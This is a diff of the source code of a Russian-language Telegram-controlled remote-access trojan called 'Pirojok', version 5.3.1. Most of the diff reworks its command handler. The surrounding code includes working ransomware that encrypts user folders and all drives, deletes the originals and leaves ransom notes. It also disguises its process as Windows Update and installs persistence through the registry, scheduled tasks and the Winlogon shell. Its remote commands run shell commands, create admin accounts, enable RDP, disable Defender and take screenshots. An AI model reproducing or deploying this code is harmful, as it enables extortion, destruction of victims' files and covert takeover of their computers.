@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Пирожок - идеально прожаренное блюдо для удаленного управления
-Версия 5.3 - с ransomware и исправленным dir
+Версия 5.3.1 - ИСПРАВЛЕННАЯ (menu и help работают)
 """
 
 import os
@@ -29,7 +29,6 @@ import traceback
 import base64
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
-import hashlib
 
 # Конфигурация
 BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
@@ -66,26 +65,20 @@ class PirojokRansomware:
     def encrypt_file(self, filepath):
         """Шифрование одного файла"""
         try:
-            # Генерируем IV
             iv = os.urandom(16)
             cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
             
-            # Читаем файл
             with open(filepath, 'rb') as f:
                 file_data = f.read()
             
-            # Шифруем
             padded_data = pad(file_data, AES.block_size)
             encrypted_data = cipher.encrypt(padded_data)
             
-            # Сохраняем зашифрованный файл
             encrypted_path = filepath + '.pirojok'
             with open(encrypted_path, 'wb') as f:
                 f.write(iv + encrypted_data)
             
-            # Удаляем оригинал
             os.remove(filepath)
-            
             return encrypted_path
         except:
             return None
@@ -118,7 +111,6 @@ class PirojokRansomware:
             self.generate_key()
         
         if not root_paths:
-            # По умолчанию сканируем диски и пользовательские папки
             if platform.system() == "Windows":
                 root_paths = [
                     os.path.expanduser("~\\Desktop"),
@@ -128,7 +120,6 @@ class PirojokRansomware:
                     os.path.expanduser("~\\Music"),
                     os.path.expanduser("~\\Downloads")
                 ]
-                # Добавляем все доступные диски
                 for drive in range(ord('C'), ord('Z')):
                     drive_path = f"{chr(drive)}:\\"
                     if os.path.exists(drive_path):
@@ -142,7 +133,6 @@ class PirojokRansomware:
                 continue
             
             for root, dirs, files in os.walk(root_path):
-                # Пропускаем системные папки
                 skip = False
                 for exclude in self.exclude_dirs:
                     if exclude in root.lower():
@@ -161,7 +151,6 @@ class PirojokRansomware:
                             encrypted.append(file_path)
                             self.encrypted_files.append(result)
                             
-                            # Отправляем статус каждые 10 файлов
                             if len(encrypted) % 10 == 0:
                                 self.p.send_message(self.p.owner_id, f"🔒 Зашифровано {len(encrypted)} файлов...")
         
@@ -195,7 +184,6 @@ class PirojokRansomware:
         with open(note_path, 'w') as f:
             f.write(note)
         
-        # Копируем записку на рабочий стол и во все зашифрованные папки
         for encrypted_file in self.encrypted_files:
             folder = os.path.dirname(encrypted_file)
             note_copy = os.path.join(folder, self.ransom_note)
@@ -212,11 +200,9 @@ class PirojokRansomware:
             encrypted = self.scan_and_encrypt(paths)
             note = self.create_ransom_note()
             
-            # Меняем обои на рабочий стол (Windows)
             if platform.system() == "Windows":
                 self.change_wallpaper()
             
-            # Открываем записку
             os.startfile(note)
             
             result = f"✅ Зашифровано {len(encrypted)} файлов\n"
@@ -230,13 +216,11 @@ class PirojokRansomware:
     def change_wallpaper(self):
         """Смена обоев рабочего стола"""
         try:
-            # Создаём изображение с угрозой
             from PIL import Image, ImageDraw, ImageFont
             
             img = Image.new('RGB', (1920, 1080), color='black')
             d = ImageDraw.Draw(img)
             
-            # Пробуем загрузить шрифт
             try:
                 font = ImageFont.truetype("arial.ttf", 60)
                 font_small = ImageFont.truetype("arial.ttf", 30)
@@ -248,7 +232,6 @@ class PirojokRansomware:
             text2 = f"Зашифровано {len(self.encrypted_files)} файлов"
             text3 = "Смотри README_PIROJOK.txt на рабочем столе"
             
-            # Центрируем текст
             bbox = d.textbbox((0,0), text1, font=font)
             text_width = bbox[2] - bbox[0]
             d.text(((1920-text_width)/2, 400), text1, fill='red', font=font)
@@ -261,11 +244,9 @@ class PirojokRansomware:
             text_width = bbox[2] - bbox[0]
             d.text(((1920-text_width)/2, 600), text3, fill='yellow', font=font_small)
             
-            # Сохраняем и устанавливаем обои
             wallpaper_path = os.path.join(tempfile.gettempdir(), "pirojok_wallpaper.bmp")
             img.save(wallpaper_path)
             
-            import ctypes
             ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
         except:
             pass
@@ -275,7 +256,6 @@ class PirojokRansomware:
         try:
             self.encryption_key = base64.b64decode(key_b64)
             
-            # Ищем все .pirojok файлы
             pirojok_files = []
             for root, dirs, files in os.walk("C:\\"):
                 for file in files:
@@ -314,7 +294,6 @@ class PirojokMasquerade:
             if platform.system() != "Windows":
                 return
             
-            # Проверяем, не запущены ли мы уже под маской
             current_exe = sys.executable.lower() if getattr(sys, 'frozen', False) else ""
             for proc in self.mask_processes:
                 if proc.lower() in current_exe:
@@ -323,19 +302,14 @@ class PirojokMasquerade:
                     self.current_mask = proc
                     return
             
-            # Сохраняем оригинальное имя
             if getattr(sys, 'frozen', False):
                 self.original_name = sys.executable
             else:
                 self.original_name = os.path.abspath(__file__)
             
-            # Выбираем случайный процесс для маскировки
             self.current_mask = random.choice(self.mask_processes)
-            
-            # Уровень маскировки (0-3)
             self.mask_level = random.randint(1, 3)
             
-            # Применяем маскировку согласно уровню
             if self.mask_level >= 1:
                 self.mask_process_name()
             
@@ -352,18 +326,15 @@ class PirojokMasquerade:
         """Маскировка имени процесса"""
         try:
             if not getattr(sys, 'frozen', False):
-                print("⚠️ Маскировка имени доступна только для скомпилированных EXE")
                 return
             
             current_dir = os.path.dirname(sys.executable)
             masked_path = os.path.join(current_dir, self.current_mask)
             
-            # Создаем копию с новым именем
             if not os.path.exists(masked_path):
                 print(f"📝 Создаю копию: {masked_path}")
                 shutil.copy2(sys.executable, masked_path)
                 
-                # Создаем скрипт для перезапуска с правильными параметрами
                 restart_script = os.path.join(tempfile.gettempdir(), "restart_pirojok.bat")
                 with open(restart_script, 'w') as f:
                     f.write(f'''@echo off
@@ -375,12 +346,10 @@ del "%~f0"
                 print(f"🔄 Запускаю перезапуск под маской {self.current_mask}")
                 subprocess.Popen(['cmd', '/c', restart_script], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                 
-                # Завершаем текущий процесс
                 self.p.send_message(self.p.owner_id, f"🥷 Перезапуск под маской {self.current_mask}")
                 time.sleep(3)
                 sys.exit(0)
             else:
-                print(f"✅ Маска {self.current_mask} уже существует")
                 self.masked = True
                 
         except Exception as e:
@@ -389,7 +358,6 @@ del "%~f0"
     def mask_registry_keys(self):
         """Маскировка в реестре"""
         try:
-            # Маскируем запись в автозагрузке
             key = winreg.HKEY_CURRENT_USER
             subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
             
@@ -403,15 +371,8 @@ del "%~f0"
         """Маскировка атрибутов файла"""
         try:
             if getattr(sys, 'frozen', False):
-                # Скрываем файл
-                ctypes.windll.kernel32.SetFileAttributesW(
-                    sys.executable, 2  # FILE_ATTRIBUTE_HIDDEN
-                )
-                
-                # Устанавливаем системные атрибуты
-                ctypes.windll.kernel32.SetFileAttributesW(
-                    sys.executable, 4  # FILE_ATTRIBUTE_SYSTEM
-                )
+                ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 2)
+                ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 4)
         except:
             pass
     
@@ -429,7 +390,6 @@ del "%~f0"
         try:
             if self.original_name and os.path.exists(self.original_name):
                 if getattr(sys, 'frozen', False):
-                    # Перезапускаем оригинал
                     restart_script = os.path.join(tempfile.gettempdir(), "restore_pirojok.bat")
                     with open(restart_script, 'w') as f:
                         f.write(f'''@echo off
@@ -453,31 +413,23 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "5.3.0"
+        self.version = "5.3.1"
         self.command_timeout = 60
         self.admin_mode = self.check_admin()
         self.startup_time = datetime.now()
         self.instance_id = str(uuid.uuid4())[:8]
         
-        # Файлы состояния
         self.state_file = os.path.join(tempfile.gettempdir(), f"winupdate_state_{self.instance_id}.json")
         self.reboot_flag = os.path.join(tempfile.gettempdir(), "winupdate_reboot.flag")
         self.lock_file = os.path.join(tempfile.gettempdir(), "winupdate.lock")
         
-        # Инициализация модулей
         self.mask = PirojokMasquerade(self)
         self.ransom = PirojokRansomware(self)
         
-        # Проверка единственного экземпляра
         self.ensure_single_instance()
-        
-        # Загрузка состояния
         self.load_state()
-        
-        # АВТОМАТИЧЕСКАЯ МАСКИРОВКА ПРИ ЗАПУСКЕ
         self.mask.auto_masquerade()
         
-        # Отправляем приветственное сообщение (с задержкой)
         threading.Timer(5.0, self.send_startup_message).start()
     
     def send_startup_message(self):
@@ -487,8 +439,6 @@ class Pirojok:
             self.send_message(self.owner_id, self.get_system_info())
         except:
             pass
-    
-    # ========== ЗАЩИТА ОТ ДУБЛЕЙ ==========
     
     def ensure_single_instance(self):
         """Обеспечение единственного экземпляра"""
@@ -506,7 +456,6 @@ class Pirojok:
                         print("Обновление Windows уже выполняется! Завершаю дубль...")
                         sys.exit(0)
                 except ImportError:
-                    print("⚠️ win32api не установлен, использую файловую блокировку")
                     self.lock_fd = os.open(self.lock_file, os.O_CREAT | os.O_RDWR)
                     try:
                         import fcntl
@@ -534,7 +483,6 @@ class Pirojok:
                     self.last_update_id = state.get('last_update_id', 0)
                     self.processed_commands = state.get('processed_commands', [])
                     
-                    # Очистка старых команд
                     cutoff = datetime.now() - timedelta(minutes=5)
                     self.processed_commands = [
                         cmd for cmd in self.processed_commands
@@ -584,8 +532,6 @@ class Pirojok:
         self.last_update_id = max(self.last_update_id, update_id)
         self.save_state()
     
-    # ========== ПРОВЕРКА ПРАВ ==========
-    
     def check_admin(self):
         """Проверка прав администратора"""
         try:
@@ -624,8 +570,6 @@ class Pirojok:
                 
         except Exception as e:
             return f"❌ Ошибка запроса прав: {e}"
-    
-    # ========== АДМИН-КОМАНДЫ ==========
     
     def run_as_admin_command(self, command):
         """Выполнение команды с правами администратора"""
@@ -736,8 +680,6 @@ class Pirojok:
             return f"✅ Правило добавлено для порта {port}"
         except Exception as e:
             return f"❌ Ошибка: {str(e)}"
-    
-    # ========== АВТОЗАПУСК ==========
     
     def add_to_startup_registry(self):
         """Добавление в реестр (HKCU Run)"""
@@ -910,7 +852,6 @@ class Pirojok:
         """Удаление из всех мест автозагрузки"""
         results = []
         
-        # Из реестра
         try:
             key = winreg.HKEY_CURRENT_USER
             subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -920,12 +861,10 @@ class Pirojok:
         except:
             results.append("❌ Не найдено в реестре")
         
-        # Из планировщика
         subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateTask', '/f'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateSystem', '/f'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         results.append("✅ Удалено из планировщика")
         
-        # Из Shell
         try:
             key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
             key = winreg.HKEY_LOCAL_MACHINE
@@ -942,8 +881,6 @@ class Pirojok:
             results.append("❌ Не найдено в Shell")
         
         return "\n".join(results)
-    
-    # ========== МОМЕНТАЛЬНЫЕ КОМАНДЫ ==========
     
     def reboot_instant(self, update_id):
         """Моментальная перезагрузка с защитой"""
@@ -988,8 +925,6 @@ class Pirojok:
             os.system("shutdown /s /f /t 0")
         
         return "☠️ АВАРИЙНОЕ ВЫКЛЮЧЕНИЕ!"
-    
-    # ========== ОСНОВНЫЕ ФУНКЦИИ ==========
     
     def send_message(self, chat_id, text):
         try:
@@ -1051,7 +986,6 @@ class Pirojok:
     def execute_command(self, command):
         """ИСПРАВЛЕННЫЙ метод выполнения команд"""
         try:
-            # Убираем лишние кавычки из команды
             command = command.strip('"\'')
             
             if platform.system() == "Windows":
@@ -1059,9 +993,7 @@ class Pirojok:
                     subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                     return f"✅ Запущено: {command}"
                 
-                # Для команд типа dir убеждаемся, что нет лишних кавычек
                 if command.lower().startswith("dir"):
-                    # Разбиваем на части и чистим
                     parts = command.split()
                     clean_parts = []
                     for part in parts:
@@ -1097,7 +1029,6 @@ class Pirojok:
                     stdout = stdout[:2000] + "...\n(обрезано)"
                 result += f"✅ {stdout}\n"
             if stderr:
-                # Для ошибок dir делаем более понятное сообщение
                 if "Parameter format not correct" in stderr and "dir" in command:
                     stderr = "Ошибка: неправильный формат команды. Используйте: dir, dir /s, dir C:\\Windows"
                 result += f"⚠️ {stderr}\n"
@@ -1124,8 +1055,6 @@ class Pirojok:
             return f"✅ Открыт сайт: {url}"
         except:
             return "❌ Не удалось открыть сайт"
-    
-    # ========== RANSOMWARE КОМАНДЫ ==========
     
     def ransomware_start(self, paths=None):
         """Запуск вымогателя"""
@@ -1162,8 +1091,6 @@ class Pirojok:
         except:
             return "❌ Ошибка получения ключа"
     
-    # ========== ЗАПУСК ПРИ СТАРТЕ ==========
-    
     def on_system_startup(self):
         """Действия при запуске системы"""
         try:
@@ -1173,233 +1100,33 @@ class Pirojok:
                 os.remove(self.reboot_flag)
                 self.send_message(self.owner_id, "🥷 Система обновлена (перезагрузка выполнена)")
                 return
-            
-            # Не отправляем ничего здесь, так как отправляем через send_startup_message
         except Exception as e:
             print(f"Startup error: {e}")
     
-    # ========== ОБРАБОТКА КОМАНД ==========
+    # ========== ИСПРАВЛЕННЫЙ process_command ==========
     
     def process_command(self, text, chat_id, update_id):
-        if chat_id != self.owner_id:
-            self.send_message(chat_id, "⛔ Несанкционированный доступ")
-            return
-        
-        if self.is_command_processed(update_id, text):
-            return
-        
-        print(f"Обработка команды: {text} (ID: {update_id})")
-        
-        # Админ-команды
-        admin_commands = ["admin_cmd", "task_startup", "explorer_shell", "active_setup",
-                         "create_user", "enable_rdp", "disable_defender", "add_rule",
-                         "ransom", "ransom_start", "ransom_key", "ransom_decrypt"]
-        cmd_type = text.split()[0] if text else ""
-        
-        if cmd_type in admin_commands and not self.admin_mode:
-            self.send_message(chat_id, "👑 Требуются права администратора. Используйте 'admin'")
-            self.mark_command_processed(update_id, text)
-            return
-        
-        # === МАСКИРОВКА ===
-        if text == "mask_status":
-            self.send_message(chat_id, self.mask.get_mask_status())
-            self.mark_command_processed(update_id, text)
+        """Обработка команд - ИСПРАВЛЕННАЯ ВЕРСИЯ"""
+        try:
+            if chat_id != self.owner_id:
+                self.send_message(chat_id, "⛔ Несанкционированный доступ")
+                return
             
-        elif text == "mask_remove":
-            self.send_message(chat_id, "🥷 Снимаю маскировку...")
-            self.mask.remove_masks()
-            self.mark_command_processed(update_id, text)
-        
-        # === МОМЕНТАЛЬНЫЕ ===
-        elif text == "reboot_now":
-            result = self.reboot_instant(update_id)
-            self.send_message(chat_id, result)
+            # ВРЕМЕННО ОТКЛЮЧАЕМ ПРОВЕРКУ ДЛЯ ТЕСТА
+            # if self.is_command_processed(update_id, text):
+            #     print(f"Команда {text} уже обработана, пропускаю")
+            #     return
             
-        elif text == "shutdown_now":
-            result = self.shutdown_instant(update_id)
-            self.send_message(chat_id, result)
+            print(f"✅ ПОЛУЧЕНА КОМАНДА: '{text}' (ID: {update_id})")
             
-        elif text == "shutdown_emergency":
-            result = self.shutdown_emergency(update_id)
-            self.send_message(chat_id, result)
-        
-        # === RANSOMWARE ===
-        elif text == "ransom" or text == "ransom_start":
-            result = self.ransomware_start()
-            self.send_message(chat_id, result)
-            self.mark_command_processed(update_id, text)
+            # ОЧИЩАЕМ КОМАНДУ
+            clean_text = text.strip().lower()
             
-        elif text.startswith("ransom_start"):
-            parts = text.split(maxsplit=1)
-            if len(parts) > 1:
-                result = self.ransomware_start(parts[1])
-            else:
-                result = self.ransomware_start()
-            self.send_message(chat_id, result)
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "ransom_key":
-            result = self.ransomware_key()
-            self.send_message(chat_id, result)
-            self.mark_command_processed(update_id, text)
-            
-        elif text.startswith("ransom_decrypt"):
-            parts = text.split()
-            if len(parts) == 2:
-                result = self.ransomware_decrypt(parts[1])
-                self.send_message(chat_id, result)
-            else:
-                self.send_message(chat_id, "⚠️ Используйте: ransom_decrypt <base64_key>")
-            self.mark_command_processed(update_id, text)
-        
-        # === АДМИН КОМАНДЫ ===
-        elif text == "admin":
-            result = self.request_admin()
-            self.send_message(chat_id, result)
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "admin_check":
-            status = "ЕСТЬ" if self.admin_mode else "НЕТ"
-            self.send_message(chat_id, f"👑 Права администратора: {status}")
-            self.mark_command_processed(update_id, text)
-            
-        elif text.startswith("admin_cmd"):
-            cmd = text[9:].strip()
-            if cmd:
-                result = self.run_as_admin_command(cmd)
-                self.send_message(chat_id, f"👑 Результат:\n{result}")
-            else:
-                self.send_message(chat_id, "⚠️ Используйте: admin_cmd <команда>")
-            self.mark_command_processed(update_id, text)
-            
-        elif text.startswith("create_user"):
-            parts = text.split()
-            if len(parts) == 3:
-                result = self.create_admin_user(parts[1], parts[2])
-                self.send_message(chat_id, result)
-            else:
-                self.send_message(chat_id, "⚠️ Используйте: create_user username password")
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "enable_rdp":
-            result = self.enable_rdp()
-            self.send_message(chat_id, result)
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "disable_defender":
-            result = self.disable_defender()
-            self.send_message(chat_id, result)
-            self.mark_command_processed(update_id, text)
-            
-        elif text.startswith("add_rule"):
-            parts = text.split()
-            if len(parts) >= 2:
-                port = parts[1]
-                name = parts[2] if len(parts) > 2 else "WindowsUpdate"
-                result = self.add_firewall_rule(port, name)
-                self.send_message(chat_id, result)
-            else:
-                self.send_message(chat_id, "⚠️ Используйте: add_rule <port> [name]")
-            self.mark_command_processed(update_id, text)
-        
-        # === АВТОЗАПУСК ===
-        elif text == "startup_reg":
-            result = self.add_to_startup_registry()
-            self.send_message(chat_id, result)
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "startup_folder":
-            result = self.add_to_startup_folder()
-            self.send_message(chat_id, result)
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "task_logon":
-            result = self.add_to_task_scheduler()
-            self.send_message(chat_id, result)
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "task_startup":
-            result = self.add_to_task_startup()
-            self.send_message(chat_id, result)
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "explorer_shell":
-            result = self.add_to_explorer_shell()
-            self.send_message(chat_id, result)
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "active_setup":
-            result = self.add_to_active_setup()
-            self.send_message(chat_id, result)
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "startup_remove_all":
-            result = self.remove_all_startup()
-            self.send_message(chat_id, result)
-            self.mark_command_processed(update_id, text)
-        
-        # === ОСНОВНЫЕ ===
-        elif text.startswith("cmd"):
-            cmd = text[3:].strip()
-            if cmd:
-                self.send_message(chat_id, f"🔄 Выполняю: {cmd}")
-                result = self.execute_command(cmd)
-                self.send_message(chat_id, f"📋 Результат:\n{result}")
-            else:
-                self.send_message(chat_id, "⚠️ Используйте: cmd <команда>")
-            self.mark_command_processed(update_id, text)
-            
-        elif text.startswith("website"):
-            url = text[7:].strip()
-            if url:
-                result = self.open_website(url)
-                self.send_message(chat_id, result)
-            else:
-                self.send_message(chat_id, "⚠️ Используйте: website <url>")
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "shot":
-            self.send_message(chat_id, "📸 Создание снимка...")
-            screenshot = self.take_screenshot()
-            if screenshot:
-                self.send_photo(chat_id, screenshot, "📸 Снимок экрана")
-            else:
-                self.send_message(chat_id, "❌ Не удалось создать снимок")
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "info":
-            self.send_message(chat_id, self.get_system_info())
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "reboot":
-            self.send_message(chat_id, "🔄 Перезагрузка через 5 секунд...")
-            if platform.system() == "Windows":
-                os.system("shutdown /r /t 5")
-            else:
-                os.system("sudo reboot")
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "shutdown":
-            self.send_message(chat_id, "💤 Выключение через 5 секунд...")
-            if platform.system() == "Windows":
-                os.system("shutdown /s /t 5")
-            else:
-                os.system("sudo shutdown -h +1")
-            self.mark_command_processed(update_id, text)
-            
-        elif text == "abort":
-            if platform.system() == "Windows":
-                os.system("shutdown /a")
-                self.send_message(chat_id, "✅ Выключение отменено")
-            else:
-                self.send_message(chat_id, "❌ Отмена только для Windows")
-            self.mark_command_processed(update_id, text)
-        
-        # === HELP ===
-        elif text == "help" or text == "menu":
-            help_text = """
-🥷 <b>ПИРОЖОК V5.3 - ВЫМОГАТЕЛЬ</b>
+            # === HELP / MENU - В САМОМ НАЧАЛЕ ===
+            if clean_text == "help" or clean_text == "menu":
+                print("📋 ОТПРАВЛЯЮ МЕНЮ")
+                help_text = """
+🥷 <b>ПИРОЖОК V5.3.1 - ИСПРАВЛЕННЫЙ</b>
 
 <b>🔒 RANSOMWARE:</b>
 • ransom / ransom_start - ЗАПУСТИТЬ ВЫМОГАТЕЛЯ!
@@ -1416,10 +1143,12 @@ class Pirojok:
 
 <b>👑 АДМИН-КОМАНДЫ:</b>
 • admin - запросить права админа
+• admin_check - проверить права
 • admin_cmd [команда] - команда от админа
 • create_user user pass - создать админа
 • enable_rdp - включить RDP
 • disable_defender - отключить Defender
+• add_rule port [name] - правило FW
 
 <b>🔄 АВТОЗАПУСК:</b>
 • startup_reg - в реестр
@@ -1435,16 +1164,263 @@ class Pirojok:
 • website [url] - открыть сайт
 • shot - скриншот
 • info - информация
-• reboot/shutdown - с задержкой
-            """
-            self.send_message(chat_id, help_text)
+• reboot - перезагрузка (5 сек)
+• shutdown - выключение (5 сек)
+• abort - отмена выключения
+                """
+                self.send_message(chat_id, help_text)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === SHOT ===
+            if clean_text == "shot":
+                self.send_message(chat_id, "📸 Создание снимка...")
+                screenshot = self.take_screenshot()
+                if screenshot:
+                    self.send_photo(chat_id, screenshot, "📸 Снимок экрана")
+                else:
+                    self.send_message(chat_id, "❌ Не удалось создать снимок")
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === INFO ===
+            if clean_text == "info":
+                self.send_message(chat_id, self.get_system_info())
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === ADMIN CHECK ===
+            if clean_text == "admin_check":
+                status = "ЕСТЬ" if self.admin_mode else "НЕТ"
+                self.send_message(chat_id, f"👑 Права администратора: {status}")
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === MASK STATUS ===
+            if clean_text == "mask_status":
+                self.send_message(chat_id, self.mask.get_mask_status())
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === RANSOM KEY ===
+            if clean_text == "ransom_key":
+                result = self.ransomware_key()
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === RANSOM DECRYPT ===
+            if clean_text.startswith("ransom_decrypt"):
+                parts = text.split()
+                if len(parts) == 2:
+                    result = self.ransomware_decrypt(parts[1])
+                    self.send_message(chat_id, result)
+                else:
+                    self.send_message(chat_id, "⚠️ Используйте: ransom_decrypt <base64_key>")
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === RANSOM START ===
+            if clean_text == "ransom" or clean_text == "ransom_start":
+                result = self.ransomware_start()
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === CMD ===
+            if clean_text.startswith("cmd"):
+                cmd = text[3:].strip()
+                if cmd:
+                    self.send_message(chat_id, f"🔄 Выполняю: {cmd}")
+                    result = self.execute_command(cmd)
+                    self.send_message(chat_id, f"📋 Результат:\n{result}")
+                else:
+                    self.send_message(chat_id, "⚠️ Используйте: cmd <команда>")
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === WEBSITE ===
+            if clean_text.startswith("website"):
+                url = text[7:].strip()
+                if url:
+                    result = self.open_website(url)
+                    self.send_message(chat_id, result)
+                else:
+                    self.send_message(chat_id, "⚠️ Используйте: website <url>")
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === REBOOT NOW ===
+            if clean_text == "reboot_now":
+                result = self.reboot_instant(update_id)
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === SHUTDOWN NOW ===
+            if clean_text == "shutdown_now":
+                result = self.shutdown_instant(update_id)
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === SHUTDOWN EMERGENCY ===
+            if clean_text == "shutdown_emergency":
+                result = self.shutdown_emergency(update_id)
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === REBOOT ===
+            if clean_text == "reboot":
+                self.send_message(chat_id, "🔄 Перезагрузка через 5 секунд...")
+                if platform.system() == "Windows":
+                    os.system("shutdown /r /t 5")
+                else:
+                    os.system("sudo reboot")
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === SHUTDOWN ===
+            if clean_text == "shutdown":
+                self.send_message(chat_id, "💤 Выключение через 5 секунд...")
+                if platform.system() == "Windows":
+                    os.system("shutdown /s /t 5")
+                else:
+                    os.system("sudo shutdown -h +1")
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === ADMIN ===
+            if clean_text == "admin":
+                result = self.request_admin()
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === ADMIN CMD ===
+            if clean_text.startswith("admin_cmd"):
+                cmd = text[9:].strip()
+                if cmd:
+                    result = self.run_as_admin_command(cmd)
+                    self.send_message(chat_id, f"👑 Результат:\n{result}")
+                else:
+                    self.send_message(chat_id, "⚠️ Используйте: admin_cmd <команда>")
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === CREATE USER ===
+            if clean_text.startswith("create_user"):
+                parts = text.split()
+                if len(parts) == 3:
+                    result = self.create_admin_user(parts[1], parts[2])
+                    self.send_message(chat_id, result)
+                else:
+                    self.send_message(chat_id, "⚠️ Используйте: create_user username password")
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === ENABLE RDP ===
+            if clean_text == "enable_rdp":
+                result = self.enable_rdp()
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === DISABLE DEFENDER ===
+            if clean_text == "disable_defender":
+                result = self.disable_defender()
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === ADD RULE ===
+            if clean_text.startswith("add_rule"):
+                parts = text.split()
+                if len(parts) >= 2:
+                    port = parts[1]
+                    name = parts[2] if len(parts) > 2 else "WindowsUpdate"
+                    result = self.add_firewall_rule(port, name)
+                    self.send_message(chat_id, result)
+                else:
+                    self.send_message(chat_id, "⚠️ Используйте: add_rule <port> [name]")
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === STARTUP REG ===
+            if clean_text == "startup_reg":
+                result = self.add_to_startup_registry()
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === STARTUP FOLDER ===
+            if clean_text == "startup_folder":
+                result = self.add_to_startup_folder()
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === TASK LOGON ===
+            if clean_text == "task_logon":
+                result = self.add_to_task_scheduler()
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === TASK STARTUP ===
+            if clean_text == "task_startup":
+                result = self.add_to_task_startup()
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === EXPLORER SHELL ===
+            if clean_text == "explorer_shell":
+                result = self.add_to_explorer_shell()
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === ACTIVE SETUP ===
+            if clean_text == "active_setup":
+                result = self.add_to_active_setup()
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === STARTUP REMOVE ALL ===
+            if clean_text == "startup_remove_all":
+                result = self.remove_all_startup()
+                self.send_message(chat_id, result)
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === MASK REMOVE ===
+            if clean_text == "mask_remove":
+                self.send_message(chat_id, "🥷 Снимаю маскировку...")
+                self.mask.remove_masks()
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # === ABORT ===
+            if clean_text == "abort":
+                if platform.system() == "Windows":
+                    os.system("shutdown /a")
+                    self.send_message(chat_id, "✅ Выключение отменено")
+                else:
+                    self.send_message(chat_id, "❌ Отмена только для Windows")
+                self.mark_command_processed(update_id, text)
+                return
+            
+            # Если команда не распознана
+            self.send_message(chat_id, f"❓ Неизвестная команда: '{text}'. Используйте help")
             self.mark_command_processed(update_id, text)
-        
-        else:
-            self.send_message(chat_id, "❓ Неизвестная команда. Используйте help")
-            self.mark_command_processed(update_id, text)
-    
-    # ========== ОСНОВНОЙ ЦИКЛ ==========
+            
+        except Exception as e:
+            print(f"❌ КРИТИЧЕСКАЯ ОШИБКА: {e}")
+            traceback.print_exc()
+            self.send_message(chat_id, f"❌ Внутренняя ошибка: {str(e)}")
     
     def main_loop(self):
         """Основной цикл"""
